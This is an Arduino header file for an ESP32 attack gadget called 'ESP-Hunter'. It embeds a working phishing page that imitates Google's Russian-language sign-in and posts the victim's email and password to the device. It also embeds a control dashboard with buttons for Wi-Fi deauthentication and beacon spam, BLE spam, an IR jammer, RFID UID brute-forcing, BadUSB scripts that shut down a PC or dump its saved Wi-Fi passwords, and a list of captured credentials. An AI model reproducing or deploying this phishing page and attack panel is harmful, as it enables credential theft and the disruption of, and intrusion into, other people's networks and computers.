#ifndef WEBPAGES_H
#define WEBPAGES_H

#include <Arduino.h>

// ======================================================================
// 5. HTML-СТРАНИЦА ДЛЯ EVIL PORTAL
// ======================================================================
const char EVIL_PORTAL_HTML[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Вход — Аккаунт Google</title>
<style>body{font-family:sans-serif;background:#fff;display:flex;justify-content:center;align-items:center;height:90vh}.card{max-width:400px;padding:40px;border:1px solid #dadce0;border-radius:8px;text-align:center}.logo{font-size:24px;font-weight:500;margin-bottom:24px}.logo span:nth-child(1){color:#4285f4}.logo span:nth-child(2){color:#ea4335}.logo span:nth-child(3){color:#fbbc05}.logo span:nth-child(4){color:#4285f4}.logo span:nth-child(5){color:#34a853}.logo span:nth-child(6){color:#ea4335}h2{font-size:24px;font-weight:400;color:#202124}p{color:#5f6368}input{width:100%;padding:14px;margin:8px 0 20px;border:1px solid #dadce0;border-radius:4px;font-size:16px;box-sizing:border-box}input:focus{border-color:#1a73e8;border-width:2px}button{background:#1a73e8;color:#fff;border:none;padding:12px 24px;font-size:14px;font-weight:500;border-radius:4px;cursor:pointer;float:right}button:hover{background:#1557b0}.step{display:none}.step.active{display:block}</style>
<script>let currentStep=1;function nextStep(e){e.preventDefault();let email=document.getElementById('email').value;if(!email)return;document.getElementById('step-1').classList.remove('active');document.getElementById('step-2').classList.add('active');document.getElementById('disp-email').innerText=email;document.getElementById('hidden-email').value=email;currentStep=2;}</script></head>
<body><div class="card"><div class="logo"><span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span></div>
<form id="step-1" class="step active" onsubmit="nextStep(event)"><h2>Вход</h2><p>Используйте аккаунт Google</p><input type="text" id="email" placeholder="Телефон или адрес эл. почты" required><button type="submit">Далее</button></form>
<form id="step-2" class="step" action="/login" method="POST"><h2>Добро пожаловать</h2><p id="disp-email" style="font-weight:500;color:#202124;margin-bottom:20px;"></p><input type="hidden" name="user" id="hidden-email"><input type="password" name="pass" placeholder="Введите пароль" required><button type="submit">Далее</button></form>
</div></body></html>
)rawliteral";

// ======================================================================
// 6. ВЕБ-ДАШБОРД (УПРАВЛЕНИЕ МЫШЬЮ, БЕЗ ЯРКОСТИ)
// ======================================================================
const char HTML_DASHBOARD[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ESP-Hunter Remote</title>
    <style>
        :root { --bg-color:#000; --card-bg:#0c0c0c; --accent:#0f0; --text:#fff; --border:#333; --glow:0 0 15px rgba(0,255,0,0.4); --danger:#f03; }
        * { box-sizing:border-box; margin:0; padding:0; font-family:'Courier New',monospace; }
        body { background:#000; color:#fff; padding:20px 0 60px; min-height:100vh; }
        .container { max-width:800px; margin:0 auto; padding:0 15px; }
        h1 { color:var(--accent); font-size:22px; text-align:center; border:2px solid var(--accent); display:inline-block; padding:8px 20px; background:#000; width:100%; max-width:400px; margin:0 auto 20px; box-shadow:inset 0 0 10px rgba(0,255,0,0.2); }
        .tabs { display:flex; flex-wrap:wrap; gap:4px; background:#0c0c0c; border:1px solid #333; padding:5px; margin-bottom:20px; }
        .tab-btn { background:transparent; border:1px solid #333; color:#888; padding:8px 12px; cursor:pointer; flex-grow:1; text-transform:uppercase; font-weight:bold; font-size:12px; }
        .tab-btn:hover { border-color:var(--accent); color:var(--accent); }
        .tab-btn.active { background:var(--accent); color:#000; border-color:var(--accent); }
        .tab-content { display:none; }
        .tab-content.active { display:block; }
        .card { background:#0c0c0c; border:1px solid #333; padding:15px; margin-bottom:15px; border-left:4px solid var(--accent); }
        .card:hover { border-color:var(--accent); box-shadow:var(--glow); }
        h3 { color:var(--accent); font-size:16px; border-bottom:1px solid #333; padding-bottom:6px; text-transform:uppercase; }
        button { background:transparent; color:var(--accent); border:2px solid var(--accent); padding:10px 15px; margin:4px 0; font-weight:bold; width:100%; cursor:pointer; text-transform:uppercase; }
        button:hover { background:var(--accent); color:#000; }
        button.danger { color:var(--danger); border-color:var(--danger); }
        button.danger:hover { background:var(--danger); color:#000; }
        button.sec { color:#888; border-color:#555; }
        button.sec:hover { background:#555; color:#000; }
        .status-box { background:#000; color:var(--accent); padding:8px; border:1px solid #333; font-size:12px; margin-top:8px; max-height:200px; overflow-y:auto; white-space:pre-wrap; }
        .status-indicator { display:inline-block; width:12px; height:12px; border-radius:50%; margin-right:8px; vertical-align:middle; }
        .status-on { background:#0f0; box-shadow:0 0 10px #0f0; }
        .status-off { background:#f03; box-shadow:0 0 10px #f03; }
        input, select { background:#000; border:1px solid #333; color:#fff; padding:10px; width:100%; margin-bottom:8px; font-family:monospace; }
        input:focus, select:focus { outline:none; border-color:var(--accent); }
        hr { border:0; border-top:1px solid #333; margin:12px 0; }
        .cursor { display:inline-block; width:8px; height:18px; background:var(--accent); margin-left:5px; vertical-align:middle; animation:blink 1s step-end infinite; }
        @keyframes blink { 50% { opacity:0; } }
        .mouse-grid { display:grid; grid-template-columns:repeat(3,1fr); gap:5px; max-width:200px; margin:10px auto; }
        .mouse-grid button { width:100%; padding:10px; font-size:18px; text-align:center; }
        .mouse-grid button:nth-child(1) { grid-column:2; }
        .mouse-grid button:nth-child(2) { grid-column:1; }
        .mouse-grid button:nth-child(3) { grid-column:3; }
        .mouse-grid button:nth-child(4) { grid-column:2; }
        .mouse-grid button:nth-child(5) { grid-column:1; }
        .mouse-grid button:nth-child(6) { grid-column:2; }
        .mouse-grid button:nth-child(7) { grid-column:3; }
        .mouse-grid button:nth-child(8) { grid-column:1; }
        .mouse-grid button:nth-child(9) { grid-column:3; }
    </style>
</head>
<body>
<div class="container">
    <div style="text-align:center;"><h1>ESP-Hunter REMOTE <span class="cursor"></span></h1></div>
    <div class="tabs">
        <button class="tab-btn active" onclick="showTab('rfid')">RFID</button>
        <button class="tab-btn" onclick="showTab('ir')">IR Hub</button>
        <button class="tab-btn" onclick="showTab('hid')">USB HID</button>
        <button class="tab-btn" onclick="showTab('portal')">Evil Portal</button>
        <button class="tab-btn" onclick="showTab('creds')">Creds</button>
        <button class="tab-btn" onclick="showTab('wifi')">Wi-Fi</button>
        <button class="tab-btn" onclick="showTab('ble')">BLE</button>
        <button class="tab-btn" onclick="showTab('mouse')">🐭 Mouse</button>
    </div>

    <!-- RFID -->
    <div id="rfid" class="tab-content active">
        <div class="card"><h3>🎴 RFID PN532</h3>
            <button onclick="apiCall('/api/rfid/scan')">🔍 Сканировать</button>
            <button onclick="apiCall('/api/rfid/emulate')">📡 Эмулировать UID</button>
            <button class="sec" onclick="apiCall('/api/rfid/erase')">🗑 Очистить Блок 4</button>
            <button class="danger" onclick="apiCall('/api/rfid/bruteforce/start')">💥 Bruteforce UID</button>
            <div class="status-box" id="rfid-info">Active UID: None</div>
        </div>
    </div>

    <!-- IR -->
    <div id="ir" class="tab-content">
        <div class="card"><h3>📺 ИК Управление</h3>
            <button class="danger" onclick="apiCall('/api/ir/tvbgone')">⚡ TV-B-GONE</button>
            <button class="sec" onclick="apiCall('/api/ir/get')">📥 Данные RX</button>
            <button class="danger" onclick="apiCall('/api/ir/jammer/start')">📡 Jammer Вкл</button>
            <button class="sec" onclick="apiCall('/api/ir/jammer/stop')">🛑 Jammer Выкл</button>
            <hr><h3>📂 Сохранённые</h3>
            <button onclick="loadIrSavedList()">📥 Загрузить список</button>
            <div class="status-box" id="ir-saved-list">Загрузка...</div>
            <div style="display:flex; gap:10px; margin-top:8px;">
                <input type="number" id="ir-saved-index" placeholder="Индекс" min="0" style="flex:1;">
                <button onclick="apiCall('/api/ir/send')">📡 Отправить</button>
            </div>
            <div class="status-box" id="ir-info">IR RAM: No signal</div>
        </div>
    </div>

    <!-- HID -->
    <div id="hid" class="tab-content">
        <div class="card"><h3>⌨️ USB HID</h3>
            <button onclick="apiCall('/api/hid/notepad')">⚡ Notepad Demo</button>
            <button class="sec" onclick="apiCall('/api/hid/payload')">💾 /payload.txt</button>
            <hr><input type="text" id="hid-text" placeholder="Текст для ПК">
            <button onclick="sendTypeString()">⌨️ Отправить текст</button>
            <hr><h3>💀 Скрипты</h3>
            <button class="danger" onclick="apiCall('/api/badusb/shutdown')">⏻ Выключить ПК</button>
            <button onclick="apiCall('/api/badusb/wallpaper')">🖼️ Сменить обои</button>
            <button class="danger" onclick="apiCall('/api/badusb/disableicons')">🗑️ Отключить иконки</button>
            <button class="danger" onclick="apiCall('/api/badusb/dumpwifi')">📶 Слить Wi-Fi</button>
        </div>
    </div>

    <!-- Evil Portal -->
    <div id="portal" class="tab-content">
        <div class="card"><h3>🚨 Evil Portal</h3>
            <button class="danger" onclick="apiCall('/api/portal/start')">🚀 Запустить</button>
            <button class="sec" onclick="apiCall('/api/portal/stop')">🛑 Остановить</button>
            <button onclick="getCreds()">📥 Обновить</button>
            <div class="status-box" id="portal-creds">Captured: 0 | Last: None</div>
            <div><span>Status: </span><span id="portal-status" class="status-indicator status-off"></span><span id="portal-status-text">Stopped</span></div>
        </div>
    </div>

    <!-- Creds -->
    <div id="creds" class="tab-content">
        <div class="card"><h3>📋 Захваченные</h3>
            <button onclick="loadCredsList()">🔄 Обновить</button>
            <div class="status-box" id="creds-list">Загрузка...</div>
        </div>
    </div>

    <!-- Wi-Fi -->
    <div id="wifi" class="tab-content">
        <div class="card"><h3>🌐 Wi-Fi</h3>
            <button onclick="scanWifi()">🔍 Сканировать</button>
            <button class="sec" onclick="apiCall('/api/wifi/wardrive')">💾 Wardrive на SD</button>
            <hr><h3>⚔️ Атаки</h3>
            <div style="display:flex; gap:10px; align-items:center; margin-bottom:8px;">
                <span>Target: </span>
                <select id="wifi-target" style="flex:1;"><option value="">-- Сканируйте --</option></select>
                <button onclick="selectWifiTarget()" class="sec" style="width:auto; padding:6px 12px;">Выбрать</button>
            </div>
            <button class="danger" onclick="apiCall('/api/wifi/beacon/start')">📡 Beacon Spam</button>
            <button class="sec" onclick="apiCall('/api/wifi/beacon/stop')">🛑 Остановить</button>
            <button class="danger" onclick="apiCall('/api/wifi/deauth/start')">🔨 Deauth</button>
            <button class="sec" onclick="apiCall('/api/wifi/deauth/stop')">🛑 Остановить</button>
            <div>
                <span>Beacon: </span><span id="beacon-status" class="status-indicator status-off"></span><span id="beacon-status-text">Stopped</span><br>
                <span>Deauth: </span><span id="deauth-status" class="status-indicator status-off"></span><span id="deauth-status-text">Stopped</span>
            </div>
            <div id="wifi-results"></div>
        </div>
    </div>

    <!-- BLE -->
    <div id="ble" class="tab-content">
        <div class="card"><h3>🔵 BLE</h3>
            <button onclick="scanBle()">🔍 Сканировать</button>
            <button class="danger" onclick="apiCall('/api/ble/spam/start')">📡 BLE Spam</button>
            <button class="sec" onclick="apiCall('/api/ble/spam/stop')">🛑 Остановить</button>
            <div><span>BLE Spam: </span><span id="ble-status" class="status-indicator status-off"></span><span id="ble-status-text">Stopped</span></div>
            <div id="ble-results"></div>
        </div>
    </div>

    <!-- MOUSE -->
    <div id="mouse" class="tab-content">
        <div class="card"><h3>🐭 Управление мышью</h3>
            <div class="mouse-grid">
                <button onclick="mouseMove(0,-20)">▲</button>
                <button onclick="mouseMove(-20,0)">◄</button>
                <button onclick="mouseMove(20,0)">►</button>
                <button onclick="mouseMove(0,20)">▼</button>
                <button onclick="mouseClick(1)">ЛК</button>
                <button onclick="mouseClick(2)">СК</button>
                <button onclick="mouseClick(3)">ПК</button>
                <button onclick="mouseScroll(-1)">▲ скролл</button>
                <button onclick="mouseScroll(1)">▼ скролл</button>
            </div>
        </div>
    </div>
</div>

<script>
    let wifiNetworks=[];

    function showTab(id) {
        document.querySelectorAll('.tab-content').forEach(c=>c.classList.remove('active'));
        document.querySelectorAll('.tab-btn').forEach(b=>b.classList.remove('active'));
        document.getElementById(id).classList.add('active');
        event.target.classList.add('active');
    }

    function apiCall(url) {
        fetch(url).then(r=>r.json()).then(data=>{
            alert(data.msg||'Выполнено');
            if(data.uid) document.getElementById('rfid-info').innerText='Active UID: '+data.uid;
            if(data.ir) document.getElementById('ir-info').innerText=data.ir;
            if(data.count) document.getElementById('portal-creds').innerText=`Captured: ${data.count} | Last: ${data.last}`;
            if(data.msg==='Evil Portal остановлен') updatePortalStatus(false);
            if(data.msg==='Evil Portal запущен на дисплее!') updatePortalStatus(true);
            if(data.msg==='Beacon Spam started') updateBeaconStatus(true);
            if(data.msg==='Beacon Spam stopped') updateBeaconStatus(false);
            if(data.msg==='Deauth started') updateDeauthStatus(true);
            if(data.msg==='Deauth stopped') updateDeauthStatus(false);
            if(data.msg==='BLE Spam started') updateBleStatus(true);
            if(data.msg==='BLE Spam stopped') updateBleStatus(false);
        }).catch(e=>alert('Ошибка'));
    }

    function sendTypeString() {
        let txt=document.getElementById('hid-text').value;
        if(!txt) return alert('Введите текст!');
        fetch('/api/hid/type?text='+encodeURIComponent(txt)).then(r=>r.json()).then(data=>alert(data.msg));
    }

    function getCreds() {
        fetch('/api/portal/creds').then(r=>r.json()).then(data=>{
            document.getElementById('portal-creds').innerText=`Captured: ${data.count} | Last: ${data.last}`;
        });
    }

    function scanWifi() {
        document.getElementById('wifi-results').innerHTML='<p class="status-box">Сканирование...</p>';
        fetch('/api/wifi/scan').then(r=>r.json()).then(data=>{
            wifiNetworks=data;
            let html='<table><tr><th>SSID</th><th>RSSI</th><th>Ch</th></tr>';
            data.forEach(n=>html+=`<tr><td>${n.ssid}</td><td>${n.rssi} dBm</td><td>${n.ch}</td></tr>`);
            html+='</table>';
            document.getElementById('wifi-results').innerHTML=html;
            let select=document.getElementById('wifi-target');
            select.innerHTML='<option value="">-- Выберите --</option>';
            data.forEach((n,i)=>{let opt=document.createElement('option');opt.value=i;opt.textContent=n.ssid+' ('+n.rssi+' dBm)';select.appendChild(opt);});
        });
    }

    function selectWifiTarget() {
        let select=document.getElementById('wifi-target');
        if(select.value==='') return alert('Выберите сеть');
        fetch('/api/wifi/select?index='+select.value).then(r=>r.json()).then(data=>alert(data.msg));
    }

    function scanBle() {
        document.getElementById('ble-results').innerHTML='<p class="status-box">Сканирование BLE...</p>';
        fetch('/api/ble/scan').then(r=>r.json()).then(data=>{
            let html='<table><tr><th>Name</th><th>MAC</th><th>RSSI</th></tr>';
            data.forEach(d=>html+=`<tr><td>${d.name||'[Hidden]'}</td><td>${d.mac}</td><td>${d.rssi}</td></tr>`);
            html+='</table>';
            document.getElementById('ble-results').innerHTML=html;
        });
    }

    function loadCredsList() {
        document.getElementById('creds-list').innerText='Загрузка...';
        fetch('/api/portal/creds/list').then(r=>r.json()).then(data=>{
            let html=data.length===0?'Нет записей.':data.map((l,i)=>`${i+1}. ${l}`).join('\n');
            document.getElementById('creds-list').innerText=html;
        }).catch(e=>document.getElementById('creds-list').innerText='Ошибка');
    }

    function loadIrSavedList() {
        document.getElementById('ir-saved-list').innerText='Загрузка...';
        fetch('/api/ir/saved/list').then(r=>r.json()).then(data=>{
            let html=data.length===0?'Нет сигналов.':data.map((l,i)=>`${i}. ${l}`).join('\n');
            document.getElementById('ir-saved-list').innerText=html;
        }).catch(e=>document.getElementById('ir-saved-list').innerText='Ошибка');
    }

    function updatePortalStatus(a){ let i=document.getElementById('portal-status'); let t=document.getElementById('portal-status-text'); if(a){i.className='status-indicator status-on';t.innerText='Running';}else{i.className='status-indicator status-off';t.innerText='Stopped';} }
    function updateBeaconStatus(a){ let i=document.getElementById('beacon-status'); let t=document.getElementById('beacon-status-text'); if(a){i.className='status-indicator status-on';t.innerText='Active';}else{i.className='status-indicator status-off';t.innerText='Stopped';} }
    function updateDeauthStatus(a){ let i=document.getElementById('deauth-status'); let t=document.getElementById('deauth-status-text'); if(a){i.className='status-indicator status-on';t.innerText='Active';}else{i.className='status-indicator status-off';t.innerText='Stopped';} }
    function updateBleStatus(a){ let i=document.getElementById('ble-status'); let t=document.getElementById('ble-status-text'); if(a){i.className='status-indicator status-on';t.innerText='Active';}else{i.className='status-indicator status-off';t.innerText='Stopped';} }

    // Mouse control
    function mouseMove(dx, dy) {
        fetch('/api/mouse/move?x='+dx+'&y='+dy).then(r=>r.json()).then(data=>console.log(data));
    }
    function mouseClick(btn) {
        fetch('/api/mouse/click?button='+btn).then(r=>r.json()).then(data=>console.log(data));
    }
    function mouseScroll(delta) {
        fetch('/api/mouse/scroll?delta='+delta).then(r=>r.json()).then(data=>console.log(data));
    }

    document.addEventListener('DOMContentLoaded',function(){ loadCredsList(); });
</script>
</body>
</html>
)rawliteral";

#endif // WEBPAGES_H
